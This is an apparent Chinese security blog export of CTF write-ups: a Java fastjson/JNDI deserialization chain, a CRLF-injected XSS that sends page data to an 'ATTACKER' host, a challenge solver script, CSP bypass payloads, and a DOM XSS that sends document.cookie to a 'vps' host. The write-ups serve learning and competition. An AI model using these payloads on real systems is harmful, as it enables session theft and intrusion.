<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span></span><br><span class="line">            Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>));</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>));</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1099/el&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;URL: &quot;</span> + u + <span class="string">&quot;, connecting&quot;</span>);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>((JMXServiceURL)u, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">MyBean</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyBean</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;conn&quot;</span>,c);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果用fastjson 1.2.60版本跑这个payload就会报<br>RMIConnector没有无参构造函数这个错误，搞得我想找平替RMIConnector的类，要满足以下三点</p>
<ul>
<li>有connect()函数</li>
<li>实现了JMXConnector接口</li>
<li>有无参构造的函数</li>
</ul>
<p>结果找了半天没找到<br>调用链如下，可以自己调试一下<br><code>BadAttributeValueExpException.readObject.toString -&gt; FastJSON -&gt; MyBean.getConnect -&gt; RMIConnector.connect -&gt; JNDI</code></p>
<h2 id="obsidian"><a href="#obsidian" class="headerlink" title="obsidian"></a>obsidian</h2><p>做题的时候一直以为是这个软件的rce，然后在那边绕过询问弹框，用<br><a href="https://forum.obsidian.md/t/possible-remote-code-execution-through-obsidian-uri-scheme/39743">https://forum.obsidian.md/t/possible-remote-code-execution-through-obsidian-uri-scheme/39743</a><br>这个poc去打rce，打的时候还一直在思考如果是这样搞的话，那为什么还需要xss➕绕过csp，结果最后还真的不是😂<br>当时还脑抽着想为什么他访问我的云服务器没有cookie</p>
<p>接下来开始分析，破解suffix就不说了</p>
<h3 id="crlf绕过csp加注入xss"><a href="#crlf绕过csp加注入xss" class="headerlink" title="crlf绕过csp加注入xss"></a>crlf绕过csp加注入xss</h3><p><img src="/2023/04/26/aliyunctf-web/1.png" alt><br>那么直接在nodeid后面加crlf注入，加xss就可以绕过csp，并且获得setcookie<br><code>http://比赛ip/note/123123%0d%0aA:B%0d%0a%0d%0a%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E%0d%0a%0d%0a</code><br>上面的链接就可以进行弹窗，而且页面会显示<br><img src="/2023/04/26/aliyunctf-web/2.png" alt><br>就是因为crlf把他本来的http响应弄成response text了<br>那么接下来就很明了了<br><code>http://比赛/note/123123%0d%0aA:B%0d%0a%0d%0a%3Cscript%3Efetch(&#39;%2Fblog&#39;).then((response)%20%3D%3E%20response.text()).then((data)%20%3D%3Ebtoa(data)).then((data)%20%3D%3Elocation.replace(%60http%3A%2F%2F</code>+ip+<code>%3A99%2F%3Fdata%3D%24%7Bdata%7D%60))%3C%2Fscript%3E%0d%0a%0d%0a</code><br>通过js注入<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/blog&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> <span class="title function_">btoa</span>(data))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> location.<span class="title function_">replace</span>(<span class="string">`http://ATTACKER/?data=<span class="subst">$&#123;data&#125;</span>`</span>))</span><br></pre></td></tr></table></figure></p>
<h2 id="OOBdetection"><a href="#OOBdetection" class="headerlink" title="OOBdetection"></a>OOBdetection</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment"># 设置目标服务器的IP地址和端口</span></span><br><span class="line">ip_address = <span class="string">&quot;47.98.209.191&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个新的套接字（socket）</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到目标服务器</span></span><br><span class="line">s.connect((ip_address, port))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line"></span><br><span class="line">resp = data.decode()</span><br><span class="line">matchs1 = re.match(<span class="string">r&quot;sha256\(XXX(.*?)\)&quot;</span>, resp)</span><br><span class="line">code1 = matchs1.group(<span class="number">1</span>).split(<span class="string">&quot; &quot;</span>)[<span class="number">2</span>].split(<span class="string">&quot;)&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">code2 = resp.split(<span class="string">&quot;==&quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;code1 : &quot;</span> + code1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;code2 : &quot;</span> + code2)</span><br><span class="line"><span class="comment"># 服务器提供的信息</span></span><br><span class="line">target_hash = code2</span><br><span class="line">salt = <span class="built_in">bytes</span>.fromhex(code1)</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re,os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NonNegativeIndexList</span>(<span class="title class_ inherited__">list</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(index, <span class="built_in">int</span>) <span class="keyword">and</span> index &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">&quot;Index cannot be negative&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__getitem__(index)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, index, value</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(index, <span class="built_in">int</span>) <span class="keyword">and</span> index &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">&quot;Index cannot be negative&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__setitem__(index, value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c_to_python_syntax</span>(<span class="params">c_code</span>):</span><br><span class="line">    array_pattern = <span class="string">r&quot;int\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\[([\sa-zA-Z0-9_+]*)\](?:\s*\[([\sa-zA-Z0-9_+]*)\])?;&quot;</span></span><br><span class="line">    assignment_pattern = <span class="string">r&quot;int\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*=\s*([0-9]+);&quot;</span></span><br><span class="line"></span><br><span class="line">    array_match = re.match(array_pattern, c_code)</span><br><span class="line">    assignment_match = re.match(assignment_pattern, c_code)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> array_match:</span><br><span class="line">        var_name = array_match.group(<span class="number">1</span>)</span><br><span class="line">        first_dim = array_match.group(<span class="number">2</span>)</span><br><span class="line">        second_dim = array_match.group(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> second_dim:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = NonNegativeIndexList([[None]*(<span class="subst">&#123;second_dim&#125;</span>)]*(<span class="subst">&#123;first_dim&#125;</span>))&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = NonNegativeIndexList([None]*(<span class="subst">&#123;first_dim&#125;</span>))&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> assignment_match:</span><br><span class="line">        var_name = assignment_match.group(<span class="number">1</span>)</span><br><span class="line">        value = assignment_match.group(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = <span class="subst">&#123;value&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid C code provided&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    code_lines = <span class="built_in">input</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> code_line <span class="keyword">in</span> code_lines:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span>(code_line.find(<span class="string">&quot;int&quot;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span>(code_line.find(<span class="string">&quot;[&quot;</span>)!= -<span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">exec</span>(c_to_python_syntax(code_line))</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">elif</span>(code_line.find(<span class="string">&#x27;=&#x27;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">exec</span>(code_line.replace(<span class="string">&#x27;int &#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">exec</span>(code_line.replace(<span class="string">&#x27;int &#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)+<span class="string">&#x27;=None&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">exec</span>(code_line) <span class="comment">#TypeError(未初始化)   IndexError（越界）   </span></span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span>(e.args[<span class="number">0</span>].find(<span class="string">&#x27;list indices must be integers or slices&#x27;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;noboo&quot;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;unknown&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;boo&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;noboo&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ifboo</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    code = patch(<span class="built_in">input</span>) <span class="comment">#补全代码</span></span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prfint</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    input_lists = <span class="built_in">input</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    new_code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> input_list <span class="keyword">in</span> input_lists:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span>(input_list[-<span class="number">1</span>] == <span class="string">&#x27;;&#x27;</span>):</span><br><span class="line">                new_code += input_list+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> new_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有可能的 XXX 值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span> ** <span class="number">6</span>):</span><br><span class="line">    <span class="comment"># 将 i 转换成 16 进制字符串，左侧填充 0 到 6 位</span></span><br><span class="line">    xxx_hex = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算哈希值</span></span><br><span class="line">    input_str = <span class="built_in">bytes</span>.fromhex(xxx_hex) + salt</span><br><span class="line">    hash_obj = hashlib.sha256(input_str)</span><br><span class="line">    hash_hex = hash_obj.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果哈希值匹配，则打印 XXX 值并退出循环</span></span><br><span class="line">    <span class="keyword">if</span> hash_hex == target_hash:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found XXX: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(xxx_hex))</span><br><span class="line">        code = xxx_hex</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">s.sendall(code.encode()+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 接收来自服务器的数据（设定接收数据的最大字节数为1024）</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;TIMETIMETIME:::::&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        data = s.recv(<span class="number">2048</span>)</span><br><span class="line">        <span class="built_in">input</span> = data.decode() <span class="comment">#Your answer (safeb/unknown):</span></span><br><span class="line">        input_code = prfint(<span class="built_in">input</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line">        </span><br><span class="line">        boo = ifboo(input_code.replace(<span class="string">&#x27;[ &#x27;</span>,<span class="string">&#x27;[&#x27;</span>).replace(<span class="string">&#x27; ]&#x27;</span>,<span class="string">&#x27;]&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span>(boo==<span class="string">&#x27;boo&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;oob&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;oob\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span>(boo==<span class="string">&#x27;noboo&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;safe&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;safe\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span>(boo==<span class="string">&#x27;unknown&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;unknown&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;unknown\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;oob&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;oob\n&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        data = s.recv(<span class="number">2048</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line">        <span class="comment"># 发送用户输入的数据到服务器</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># 关闭套接字</span></span><br><span class="line">    s.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;over!!!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>网上都是转成lark语法，我是转成了python语法，然后重载了列表，让他如果index&lt;0了，就触发异常，满足c语言的语法，然后根据不同的异常信息去判断结果</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>misc</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>csp 策略及绕过</title>
    <url>/2023/07/20/csp-%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="部分csp绕过方法"><a href="#部分csp绕过方法" class="headerlink" title="部分csp绕过方法"></a>部分csp绕过方法</h2><span id="more"></span>
<h3 id="unsafe-eval-？"><a href="#unsafe-eval-？" class="headerlink" title="unsafe-eval ？"></a>unsafe-eval ？</h3><p>csp策略<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;unsafe-eval&#x27; data: </span><br></pre></td></tr></table></figure><br>绕过代码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="CDN加载旧版js"><a href="#CDN加载旧版js" class="headerlink" title="CDN加载旧版js"></a>CDN加载旧版js</h3><p>csp策略<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src: https://cdnjs.cloudflare.com ;</span><br></pre></td></tr></table></figure><br>exp<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span> &#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;$eval(&#x27;x=1&#125; &#125; &#125;;alert(1);//&#x27;);&#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<h3 id="CRLF绕过"><a href="#CRLF绕过" class="headerlink" title="CRLF绕过"></a>CRLF绕过</h3><p>将csp策略挤到返回包的body中,记得注意content-length</p>
<h3 id="不完整script标签绕过"><a href="#不完整script标签绕过" class="headerlink" title="不完整script标签绕过"></a>不完整script标签绕过</h3><p>当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性</p>
<p>csp<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection:0&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Security-Policy&quot;</span> content=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-xxxxx&#x27;&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>]<span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">&#x27;xxxxx&#x27;</span>&gt;<span class="comment">//do some thing</span></span><br><span class="line">&lt;/script&gt; </span><br></pre></td></tr></table></figure><br>exp<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="attr">data</span>:text/plain,<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="iframe禁止js"><a href="#iframe禁止js" class="headerlink" title="iframe禁止js"></a>iframe禁止js</h3><ul>
<li>iframe标签可以设置csp，可以禁止掉某些前端过滤的js</li>
<li>如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP</li>
</ul>
<h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><p>meta标签有一些不常用的功能有时候有奇效：<br>meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;cache-control&quot;</span> content=<span class="string">&quot;public&quot;</span>&gt;</span><br></pre></td></tr></table></figure><br>meta可以设置Cookie（Firefox下），可以结合self-xss利用。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Set-Cookie&quot;</span> <span class="title class_">Content</span>=<span class="string">&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/&quot;</span>&gt;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>还有更多可以参考下面的链接</p>
</blockquote>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#unsafe-eval">https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#unsafe-eval</a></li>
<li><a href="https://www.jianshu.com/p/f1de775bc43e">https://www.jianshu.com/p/f1de775bc43e</a></li>
<li><a href="https://cloud.tencent.com/developer/chapter/13541">https://cloud.tencent.com/developer/chapter/13541</a></li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>前端</tag>
        <tag>js</tag>
        <tag>csp</tag>
      </tags>
  </entry>
  <entry>
    <title>前端ctf(持续更新)</title>
    <url>/2023/09/06/%E5%89%8D%E7%AB%AFctf/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>持续更新一些国外的前端ctf，因为接触的前端偏少，这里就集中写一下wp<br><span id="more"></span></p>
<h2 id="uiuctf-peanut-xss"><a href="#uiuctf-peanut-xss" class="headerlink" title="uiuctf peanut-xss"></a>uiuctf peanut-xss</h2><p>nutshell.js中有一段代码<br><code>linkText.innerHTML = ex.innerText.slice(ex.innerText.indexOf(&#39;:&#39;)+1);</code><br>其中innerText会html解码，而innerHTML会把赋值的内容原封不动的输出到页面中，所以如果输入的是<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&amp;lt;<span class="regexp">/span&amp;gt;&amp;lt;img src onerror=&amp;#39;fetch(&amp;quot;https:/</span><span class="regexp">/vps/</span>?cookie=&amp;quot;+<span class="variable language_">document</span>.<span class="property">cookie</span>)&amp;#<span class="number">39</span>;/&amp;gt;&amp;lt;span&amp;gt;</span><br></pre></td></tr></table></figure><br>解码完以后就是<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/span&gt;&lt;img src onerror=&#x27;fetch(&quot;https:/</span><span class="regexp">/vps/</span>?cookie=<span class="string">&quot;+document.cookie)&#x27;/&gt;&lt;span&gt;</span></span><br></pre></td></tr></table></figure><br>再把解码的内容赋值给innerHTML，那么就会造成dom xss<br>修复这个漏洞的话可以把innerHTML改成innerText<br><code>linkText.innerText = ex.innerText.slice(ex.innerText.indexOf(&#39;:&#39;)+1);</code><br>当innerText是被赋值的时候，输出到页面的时候会把html编码在输出</p>
<h2 id="google-ctf-biohazard"><a href="#google-ctf-biohazard" class="headerlink" title="google ctf biohazard"></a>google ctf biohazard</h2><p><a href="https://github.com/google/google-ctf/tree/master/2023/web-biohazard">https://github.com/google/google-ctf/tree/master/2023/web-biohazard</a><br>这是官方writeup，只对其中一些点进行记录</p>
<h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>当时看到Object.assign联想到了原型链污染，但是我是用类似下面的方式去尝试原型链污染的，显然是失败了<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;: true&#125;&#125;&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><br>但是如果是下面这种就是可以成功污染的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>((&#123;&#125;)[<span class="string">&#x27;__proto__&#x27;</span>], <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;polluted&quot;: true&#125;&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
<h3 id="污染的点-editor"><a href="#污染的点-editor" class="headerlink" title="污染的点 editor"></a>污染的点 editor</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadEditorResources</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> style = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#editor-style&#x27;</span>).<span class="property">content</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(style);</span><br><span class="line">  <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  safeScriptEl.<span class="title function_">setSrc</span>(script, <span class="title function_">trustedResourceUrl</span>(editor));</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>();</span><br><span class="line">  <span class="keyword">if</span> (!location.<span class="property">pathname</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;/view/&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_">loadEditorResources</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>当uri开头不是view的时候就会加载这个loadEditorResources函数<br>而这个函数中<br><code>safeScriptEl.setSrc(script, trustedResourceUrl(editor));</code><br>这一段会设置一个js加载进去，<em>并且会设置好nonce</em>，其中editor在bootstrap.js中被定义了，所以只需要原型链覆盖了这个editor就可以了</p>
